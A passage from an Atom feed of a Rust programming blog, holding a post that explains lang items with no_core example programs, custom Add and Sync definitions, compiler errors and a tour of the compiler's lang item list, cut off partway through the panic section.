<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[In Pursuit of Laziness]]></title>
  <link href="http://manishearth.github.io/atom.xml" rel="self"/>
  <link href="http://manishearth.github.io/"/>
  <updated>2017-01-12T08:10:35-08:00</updated>
  <id>http://manishearth.github.io/</id>
  <author>
    <name><![CDATA[Manish Goregaokar]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Rust Tidbits: What Is a Lang Item?]]></title>
    <link href="http://manishearth.github.io/blog/2017/01/11/rust-tidbits-what-is-a-lang-item/"/>
    <updated>2017-01-11T21:01:13-08:00</updated>
    <id>http://manishearth.github.io/blog/2017/01/11/rust-tidbits-what-is-a-lang-item</id>
    <content type="html"><![CDATA[<p><em>Rust is not a simple language. As with any such language, it has many little tidbits of complexity
that most folks aren&rsquo;t aware of. Many of these tidbits are ones which may not practically matter
much for everyday Rust programming, but are interesting to know. Others may be more useful. I&rsquo;ve
found that a lot of these aren&rsquo;t documented anywhere (not that they always should be), and sometimes
depend on knowledge of compiler internals or history. As a fan of programming trivia myself, I&rsquo;ve
decided to try writing about these things whenever I come across them. &ldquo;Tribal Knowledge&rdquo; shouldn&rsquo;t
be a thing in a programming community; and trivia is fun!</em></p>

<p>Previously in tidbits: <a href="http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special/"><code>Box</code> is Special</a></p>

<p>Last time I talked about <code>Box&lt;T&gt;</code> and how it is a special snowflake. Corey <a href="https://www.reddit.com/r/rust/comments/5nb86x/rust_tidbits_box_is_special/dca4y6n/?utm_content=permalink&amp;utm_medium=front&amp;utm_source=reddit&amp;utm_name=rust">asked</a> that
I write more about lang items, which are basically all of the special snowflakes in the stdlib.</p>

<p>So what <em>is</em> a lang item? Lang items are a way for the stdlib (and libcore) to define types, traits,
functions, and other items which the compiler needs to know about.</p>

<p>For example, when you write <code>x + y</code>, the compiler will effectively desugar that into
<code>Add::add(x, y)</code><sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. How did it know what trait to call? Did it just insert a call to
<code>::core::Add::add</code> and hope the trait was defined there? This is what C++ does;
the Itanium ABI spec expects functions of certain names
to just <em>exist</em>, which the compiler is supposed to call in various cases. The
<code>__cxa_guard_*</code> functions from C++s deferred-initialization local statics (which
I&rsquo;ve <a href="http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics/">explored in the past</a>) are an example of this. You&rsquo;ll find that the spec is
full of similar <code>__cxa</code> functions. While the spec just expects certain types,
e.g. <code>std::type_traits</code> (&ldquo;Type properties&rdquo; ยง 20.10.4.3), to be magic and exist in certain locations,
the compilers seem to implement them using intrinsics like <code>__is_trivial&lt;T&gt;</code> which aren&rsquo;t defined
in C++ code at all. So C++ compilers have a mix of solutions here, they partly insert calls
to known ABI functions, and they partly implement &ldquo;special&rdquo; types via intrinsics which
are detected and magicked when the compiler comes across them.</p>

<p>However, this is not Rust&rsquo;s solution. It does not care what the <code>Add</code> trait is named or where it is
placed. Instead, it knew where the trait for addition was located because <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/ops.rs#L243"><em>we told it</em></a>.
When you put <code>#[lang = "add"]</code> on a trait, the compiler knows to call <code>YourTrait::add(x, y)</code> when it
encounters the addition operator. Of course, usually the compiler will already have been told about
such a trait since libcore is usually the first library in the pipeline. If you want to actually use
this, you need to <em>replace libcore</em>.</p>

<p>Huh? You can&rsquo;t do that, can you?</p>

<p>It&rsquo;s not a big secret that you can compile rust without the stdlib using
<a href="https://doc.rust-lang.org/book/no-stdlib.html"><code>#![no_std]</code></a>. This is useful in cases when you are on an embedded system and can&rsquo;t
rely on an allocator existing. It&rsquo;s also useful for writing your own alternate stdlib, though
that&rsquo;s not something folks do often. Of course, libstd itself <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd/lib.rs#L213-L214">uses <code>#![no_std]</code></a>,
because without it the compiler will happily inject an <code>extern crate std</code> while trying to compile
libstd and the universe will implode.</p>

<p>What&rsquo;s less known is that you can do the same thing with libcore, via <code>#![no_core]</code>. And, of course,
libcore <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/lib.rs#L65">uses it</a> to avoid the cyclic dependency. Unlike <code>#![no_std]</code>, libcore is
a nightly-only feature that we may never stabilize<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. <code>#![no_core]</code> is something that&rsquo;s basically
only to be used if you <em>are</em> libcore (or you are an alternate Rust stdlib/core implementation
trying to emulate it).</p>

<p>Still, it&rsquo;s possible to write a working Rust binary in <code>no_core</code> mode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="err">#</span><span class="o">!</span><span class="p">[</span><span class="n">feature</span><span class="p">(</span><span class="n">no_core</span><span class="p">)]</span>
</span><span class='line'><span class="err">#</span><span class="o">!</span><span class="p">[</span><span class="n">feature</span><span class="p">(</span><span class="n">lang_items</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Look at me.</span>
</span><span class='line'><span class="c1">// Look at me.</span>
</span><span class='line'><span class="c1">// I&#39;m the libcore now.</span>
</span><span class='line'><span class="err">#</span><span class="o">!</span><span class="p">[</span><span class="n">no_core</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Tell the compiler to link to appropriate runtime libs</span>
</span><span class='line'><span class="c1">// (This way I don&#39;t have to specify `-l` flags explicitly)</span>
</span><span class='line'><span class="cp">#[cfg(target_os = </span><span class="s">&quot;linux&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="cp">#[link(name = </span><span class="s">&quot;c&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">extern</span> <span class="p">{}</span>
</span><span class='line'><span class="cp">#[cfg(target_os = </span><span class="s">&quot;macos&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="cp">#[link(name = </span><span class="s">&quot;System&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">extern</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Compiler needs these to proceed</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;sized&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">pub</span> <span class="k">trait</span> <span class="nb">Sized</span> <span class="p">{}</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;copy&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">pub</span> <span class="k">trait</span> <span class="n">Copy</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `main` isn&#39;t the actual entry point, `start` is.</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// we can&#39;t really do much in this benighted hellhole of</span>
</span><span class='line'>    <span class="c1">// an environment without bringing in more libraries.</span>
</span><span class='line'>    <span class="c1">// We can make syscalls, segfault, and set the exit code.</span>
</span><span class='line'>    <span class="c1">// To be sure that this actually ran, let&#39;s set the exit code.</span>
</span><span class='line'>    <span class="mi">42</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// still need a main unless we want to use `#![no_main]`</span>
</span><span class='line'><span class="c1">// won&#39;t actually get called; `start()` is supposed to call it</span>
</span><span class='line'><span class="k">fn</span> <span class="n">main</span><span class="p">()</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you run this, the program will exit with exit code 42.</p>

<p>Note that this already adds two lang items. <code>Sized</code> and <code>Copy</code>. It&rsquo;s usually worth
<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L88-L94">looking at the lang item in libcore</a> and copying it over unless you want to make
tweaks. Beware that tweaks may not always work; not only does the compiler expect the lang item
to exist, it expects it to make sense. There are properties of the lang item that it assumes
are true, and it may cause assertions in the code. In this case I do have a tweak, since
the original definition of <code>Copy</code> is <code>pub trait Copy: Clone {}</code>, but I know that this tweak
will work.</p>

<p>Lang items are usually only required when you do an operation which needs them. There are 72 non-
deprecated lang items and we only had to define three of them here. &ldquo;start&rdquo; is necessary to, well,
start executables, and <code>Copy</code>/<code>Sized</code> are very crucial to how the compiler reasons about types and
must exist.</p>

<p>But let&rsquo;s try doing something that will trigger a lang item to be required:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">static</span> <span class="n">X</span><span class="o">:</span> <span class="kt">u8</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Rust will immediately complain:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="err">$</span> <span class="n">rustc</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span>
</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">requires</span> <span class="err">`</span><span class="n">sync</span><span class="err">`</span> <span class="n">lang_item</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is because Rust wants to enforce that types in statics (which can be accessed concurrently)
are safe when accessed concurrently, i.e., they implement <code>Sync</code>. We haven&rsquo;t defined <code>Sync</code> yet,
so Rust doesn&rsquo;t know how to enforce this restruction. The <code>Sync</code> trait is defined with the &ldquo;sync&rdquo;
lang item, so we need to do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">static</span> <span class="n">X</span><span class="o">:</span> <span class="kt">u8</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;sync&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">pub</span> <span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Sync</span> <span class="p">{}</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span> <span class="n">Sync</span> <span class="k">for</span> <span class="kt">u8</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note that the trait doesn&rsquo;t have to be called <code>Sync</code> here, any trait name would work. This
definition is also a slight <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L343-L351">departure from the one in the stdlib</a>, and in general you
should include the auto trait impl (instead of specifically using <code>unsafe impl Sync for u8 {}</code>)
since the compiler may assume it exists. Our code is small enough for this to not matter.</p>

<p>Alright, let&rsquo;s try defining our own addition trait as before. First, let&rsquo;s see
what happens if we try to add a struct when addition isn&rsquo;t defined:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="p">;</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We get an error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="err">$</span> <span class="n">rustc</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span>
</span><span class='line'><span class="n">error</span><span class="p">[</span><span class="n">E0369</span><span class="p">]</span><span class="o">:</span> <span class="n">binary</span> <span class="n">operation</span> <span class="err">`</span><span class="o">+</span><span class="err">`</span> <span class="n">cannot</span> <span class="kr">be</span> <span class="n">applied</span> <span class="n">to</span> <span class="k">type</span> <span class="err">`</span><span class="n">Foo</span><span class="err">`</span>
</span><span class='line'>  <span class="o">--&gt;</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>   <span class="o">|</span>
</span><span class='line'><span class="mi">33</span> <span class="o">|</span>     <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'>   <span class="o">|</span>     <span class="o">^^^</span>
</span><span class='line'>   <span class="o">|</span>
</span><span class='line'><span class="n">note</span><span class="o">:</span> <span class="n">an</span> <span class="n">implementation</span> <span class="n">of</span> <span class="err">`</span><span class="n">std</span><span class="o">::</span><span class="n">ops</span><span class="o">::</span><span class="nb">Add</span><span class="err">`</span> <span class="n">might</span> <span class="kr">be</span> <span class="n">missing</span> <span class="k">for</span> <span class="err">`</span><span class="n">Foo</span><span class="err">`</span>
</span><span class='line'>  <span class="o">--&gt;</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>   <span class="o">|</span>
</span><span class='line'><span class="mi">33</span> <span class="o">|</span>     <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'>   <span class="o">|</span>     <span class="o">^^^</span>
</span><span class='line'>
</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">aborting</span> <span class="n">due</span> <span class="n">to</span> <span class="n">previous</span> <span class="n">error</span>
</span></code></pre></td></tr></table></div></figure>


<p>It is interesting to note that here the compiler <em>did</em> refer to <code>Add</code> by its path.
This is because the diagnostics in the compiler are free to assume that libcore
exists. However, the actual error just noted that it doesn&rsquo;t know how to add two
<code>Foo</code>s. But we can tell it how!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;add&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">trait</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">RHS</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">RHS</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Self</span><span class="o">::</span><span class="n">Output</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">Foo</span><span class="o">&gt;</span> <span class="k">for</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span> <span class="o">=</span> <span class="n">isize</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">Foo</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">42</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="p">;</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will compile fine and the exit code of the program will be 42.</p>

<p>An interesting bit of behavior is what happens if we try to add two numbers. It will give us the
same kind of error, even though I mentioned before that the addition of concrete primitives doesn&rsquo;t
go through <code>Add::add</code>. However, any addition operation still checks if <code>Add::add</code> is implemented,
even though it won&rsquo;t get <em>used</em> in the case of a primitive. We can even verify this!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;add&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">trait</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">RHS</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">RHS</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Self</span><span class="o">::</span><span class="n">Output</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">isize</span><span class="o">&gt;</span> <span class="k">for</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span> <span class="o">=</span> <span class="n">isize</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">isize</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>        <span class="bp">self</span> <span class="o">+</span> <span class="n">other</span> <span class="o">+</span> <span class="mi">50</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="p">;</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="mi">40</span> <span class="o">+</span> <span class="mi">2</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will need to be compiled with <code>-C opt-level=2</code>, since numeric addition in debug mode panics on
wrap and we haven&rsquo;t defined the <code>"panic"</code> lang item to teach the compiler <em>how</em> to panic.</p>

<p>It will exit with 42, not 92, since while the <code>Add</code> implementation is required for this to type
check, it doesn&rsquo;t actually get used.</p>

<hr />

<p>So what lang items <em>are</em> there, and why are they lang items? There&rsquo;s a <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L252-L363">big list</a> in the
compiler. Let&rsquo;s go through them:</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L254-L272"><code>ImplItem</code> ones</a> (<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd_unicode/char.rs#L134-L135">core</a>) are used to mark implementations on
primitive types. <code>char</code> has some methods, and <em>someone</em> has to say <code>impl char</code> to define them. But
coherence only allows us to impl methods on types defined in our own crate, and <code>char</code> isn&rsquo;t defined
&hellip; in any crate, so how do we add methods to it? <code>#[lang = "char"]</code> provides an escape hatch;
applying that to <code>impl char</code> will allow you to break the coherence rules and add methods,
<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd_unicode/char.rs#L134-L135">as is done in the standard library</a>. Since lang items can only be defined once, only
a single crate gets the honor of adding methods to <code>char</code>, so we don&rsquo;t have any of the issues that
arise from sidestepping coherence.</p>

<p>There are a bunch for the <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L274-L278">marker traits</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/marker.rs#L41-L356">core</a>):</p>

<ul>
<li><code>Send</code> is a lang item because you are allowed to use it in a <code>+</code> bound in a trait object (<code>Box&lt;SomeTrait+Send+Sync&gt;</code>), and the compiler caches it aggressively</li>
<li><code>Sync</code> is a lang item for the same reasons as <code>Send</code>, but also because the compiler needs to enforce its implementation on types used in statics</li>
<li><code>Copy</code> is fundamental to classifying values and reasoning about moves/etc, so it needs to be a lang item</li>
<li><code>Sized</code> is also fundamental to reasoning about which values may exist on the stack. It is also magically included as a bound on generic parameters unless excluded with <code>?Sized</code></li>
<li>[<code>Unsize</code>] is implemented automatically on types using a specific set of rules (<a href="https://doc.rust-lang.org/nomicon/coercions.html">listed in the nomicon</a>). Unlike <code>Send</code> and <code>Sync</code>, this mechanism for autoimplementation is tailored for the use case of <code>Unsize</code> and can&rsquo;t be reused on user-defined marker traits.</li>
</ul>


<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L280"><code>Drop</code> is a lang item</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L174-L197">core</a>) because the compiler needs to know which types have destructors, and how to call
these destructors.</p>

<p><a href="https://doc.rust-lang.org/nightly/std/ops/trait.CoerceUnsized.html"><code>CoerceUnsized</code></a> <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L282">is a lang item</a>
(<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L2743-L2746">core</a>) because the compiler is allowed to perform
<a href="https://github.com/rust-lang/rfcs/blob/master/text/0982-dst-coercion.md">DST coercions</a> (<a href="https://doc.rust-lang.org/nomicon/coercions.html">nomicon</a>) when it is implemented.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L284-L307">All of the builtin operators</a> (also <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L311-L312"><code>Deref</code></a>
and <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L318-L319"><code>PartialEq</code>/<code>PartialOrd</code></a>, which are listed later in the file) (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L243-L2035">core</a>)
are lang items because the compiler needs to know what trait to require (and call)
when it comes across such an operation.</p>

<p><a href="http://doc.rust-lang.org/std/cell/struct.UnsafeCell.html"><code>UnsafeCell</code></a> <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L309">is a lang item</a>
(<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/cell.rs#L1065-L1069">core</a>) because it has very special semantics; it prevents
certain optimizations. Specifically, Rust is allowed to reorder reads/writes to <code>&amp;mut foo</code> with the
assumption that the local variable holding the reference is the only alias allowed to read from
or write to the data, and it is allowed to reorder reads from <code>&amp;foo</code> assuming that no other alias
writes to it. We tell LLVM that these types are <code>noalias</code>. <code>UnsafeCell&lt;T&gt;</code> turns this optimization
off, allowing writes to <code>&amp;UnsafeCell&lt;T&gt;</code> references. This is used in the implementation of interior
mutability types like <code>Cell&lt;T&gt;</code>, <code>RefCell&lt;T&gt;</code>, and <code>Mutex&lt;T&gt;</code>.</p>

<p>The <a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L314-L316"><code>Fn</code> traits</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/ops.rs#L2556-L2659">core</a>) are used in dispatching function calls,
and can be specified with special syntax sugar, so they need to be lang items. They also
get autoimplemented on closures.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L321">The &ldquo;str_eq&rdquo; lang item</a> is outdated. It <em>used</em> to specify how to check the equality
of a string value against a literal string pattern in a <code>match</code> (<code>match</code> uses structural equality,
not <code>PartialEq::eq</code>), however I believe this behavior is now hardcoded in the compiler.</p>

<p><a href="https://github.com/rust-lang/rust/blob/1ca100d0428985f916eea153886762bed3909771/src/librustc/middle/lang_items.rs#L332-L334">The panic-related lang items</a> (<a href="https://github.com/rust-lang/rust/blob/408c2f7827be838aadcd05bd041dab94388af35d/src/libcore/panicking.rs#L39-L58">core</a>) exist because rustc itself
inserts panics in a few places. The first one, <code>"panic"</code>, is used for integer overflow panics in debug mode, and
